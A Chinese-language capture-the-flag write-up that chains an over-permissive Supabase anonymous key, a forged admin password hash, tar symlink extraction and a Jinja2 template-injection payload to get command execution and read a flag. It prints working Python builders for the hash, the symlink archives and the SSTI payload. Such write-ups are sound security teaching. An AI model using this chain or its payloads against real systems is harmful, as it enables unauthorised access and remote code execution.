# 博丽神社的御神签

省流：

1. 从前台识别出站点在使用类似 Supabase / PostgREST 的接口
2. 利用匿名数据库权限过宽，直接写入管理员表
3. 登录后台后，利用 tar 解包和符号链接覆写模板
4. 通过 SSTI 执行命令，从 `/tmp` 下读出 flag

## 1. 从前台识别出 PostgREST

先抓个包，这里我使用的是 Yakit，可以自己使用顺手的工具：
![](attachments/image.png)

可以很自然地发现前端在使用 `@supabase/supabase-js`，同时页面源码里还能看到：

```html
<script>
    window.__APP_CONFIG__ = {
        supabaseUrl: window.location.origin,
        supabaseKey:
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiJ9.ViljdzyyGxp5hJt9XN8WTlLTvo0F92XEqovEeSE1zRo",
    };
</script>
```

这个 key 在前端 GET 神签内容时作为 `apikey` 的键值传给后端，这是典型的匿名密钥使用方式。下面我们需要了解一些关于 Supabase 和 PostgREST 的知识：

- Supabase 是一个开源的后端即服务（BaaS）平台，它使用 PostgREST 自动将 PostgreSQL 数据库暴露为 RESTful API 接口。访问的时候需要有一个 apikey 作为身份凭证。
- apikey 是一个签名的 JWT（JSON Web Tokens），JWT 是一种紧凑的、自包含的令牌，用于安全传递信息。它由头部、载荷、签名三部分组成（用点号连接三个 base64 字符串形成）。直接解码 Head 和 Payload 就能看到算法类型、签发者、过期时间、用户ID等业务数据，而签名只用于防篡改验证。因此它是服务器可验证真伪的。可以在 [这里](https://www.jwt.io/) 解码。
- 我们的密钥解码可以得到 `"role": "anon"`，这说明这个密钥是匿名用户的密钥。Supabase 的权限系统是基于角色的，默认情况下会有一个 `anon` 角色用于匿名访问。这个角色的权限由数据库管理员在 PostgreSQL 中设置，通常会限制只能访问特定的表和列。
- 但是在某些情况下，管理员可能会错误地配置权限，导致匿名用户拥有过多的权限，例如可以访问敏感表或者执行写操作。

回到题目，我们抓包过程中还观察到抽签使用的是 `/rest/v1/omikuji_entries` 这个接口，我们尝试访问可以得到所有的神签，我们再次尝试访问 `/rest/v1`，能发现服务器未关闭自省功能，因此可以看到所有的 table，我们发现还有一个 admin 表

![](attachments/image-1.png)

## 2. 利用管理员表

直接访问对应路由看到管理员表：
![](attachments/image-2.png)

得到：

```json
[
    {
        "id": 1,
        "username": "reimu",
        "password_hash": "$pbkdf2-sha256$240000$shrineledger$9k0t4oUmLbF5258OCkSCgLHCFswMNWUPeXt4NRv-5hw"
    }
]
```

这里的密码哈希字符串是一种 [Modular Crypt Format（MCF，模块化加密格式）](https://passlib.readthedocs.io/en/stable/modular_crypt_format.html)，表示使用 `pbkdf2-sha256` 作为哈希算法，迭代次数为 240000，盐值为 `shrineledger`，哈希结果为 `9k0t4oUmLbF5258OCkSCgLHCFswMNWUPeXt4NRv-5hw`。

我们可以使用 Python 来计算哈希值，造出一个合法的密码哈希字符串，相关关键代码片段：

```python
def build_hash(password, salt, rounds=DEFAULT_ROUNDS):
    digest = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt.encode("utf-8"),
        rounds,
    )
    encoded = base64.urlsafe_b64encode(digest).decode().rstrip("=")
    return f"$pbkdf2-sha256${rounds}${salt}${encoded}"
```

然后我们 POST 这个路由就能新增一条记录，当然用 PATCH 来更改当前的方法也行。

![](attachments/image-3.png)

然后成功进入后台：

![](attachments/image-4.png)

## 3. 后台上传

进入后台，发现直接写了静态文件的目录是在 `/app/static`，且提供了一个上传 `.tar` 归档文件及其各种压缩形式的接口。由此我们推测此处为 tar 解包时的符号链接漏洞。

该漏洞属于 **任意文件写入**。其核心在于系统命令 `tar` 在解压缩时的默认行为：跟随符号链接。
- 顺序解压特性：`tar` 是按照压缩包内的文件顺序流式解压的。
- 跟随效应：如果在解压过程中，`tar` 先在当前目录下创建了一个指向敏感路径（如 `/var/www/html`）的符号链接，那么后续解压出的、路径经过该链接的文件，会被 `tar` 顺着链接直接写入到目标敏感路径中。

我们可以使用 Python 来方便地创建一个包含符号链接的压缩包：

```python
import tarfile
import io

def build_symlink_tar(filepath: str) -> None:
    """生成包含符号链接的 tar 文件"""
    with tarfile.open(filepath, mode="w") as tar:
        link = tarfile.TarInfo("pivot")
        link.type = tarfile.SYMTYPE
        link.linkname = "../app.py"
        tar.addfile(link)
```

而此处上传的文件会解压进静态文件目录，而静态文件默认是可读的，因此结合两者我们可以得到**任意文件写入**和**任意文件读取**，但是这样还不够，因为题面说了 *Flag 位于 /tmp 目录下*，显然都这么说了文件名是爆破不出来的，我们需要实现 RCE（执行任意系统命令）。

不着急，先看下常见文件，比如 `app.py`。我们直接把生成的 tar 文件上传上去再点击 pivot 就能看到 `app.py` 的正文。

![](attachments/image-5.png)

## 4. 分析与利用 app.py 实现 SSTI

我们注意到 `admin_assets_upload()` 函数中有这样的代码片段：
```python
subprocess.run(
    ["tar", "-xf", str(archive_path), "-C", str(STATIC_ROOT)],
    capture_output=True,
    text=True,
    check=True,
    timeout=ARCHIVE_EXTRACT_TIMEOUT,
)
```

这显然证实了上述漏洞的存在。然后让我们关注 RCE（执行任意命令），注意到 `app.py` 中：

```python
app.config["TEMPLATES_AUTO_RELOAD"] = True
# 模板会自动重载

@app.route("/")
def index():
    return render_template("index.html")
```

我们可以覆盖 `index.html` 的内容，来利用 SSTI（服务器端模板注入）来实现 RCE。只需用以下脚本生成对应的 tar 文件，再挨个上传即可

```python
def build_symlink_tar(filepath: str) -> None:
    """生成包含符号链接的 tar 文件"""
    with tarfile.open(filepath, mode="w") as tar:
        link = tarfile.TarInfo("pivot")
        link.type = tarfile.SYMTYPE
        link.linkname = "../templates"
        tar.addfile(link)


def build_payload_tar(filepath: str, command: str) -> None:
    """生成 payload tar 文件，内含 pivot/index.html"""
    payload = "{{ cycler.__init__.__globals__.os.popen(%r).read() }}" % command
    data = payload.encode()

    with tarfile.open(filepath, mode="w") as tar:
        tpl = tarfile.TarInfo("pivot/index.html")
        tpl.size = len(data)
        tar.addfile(tpl, io.BytesIO(data))
```

![](attachments/image-6.png)

成功覆盖，接着只需将命令改为 `cat /tmp/therealflag_1f331677e4e173f97da01a6730bf6bb7` 即可拿到 FLAG。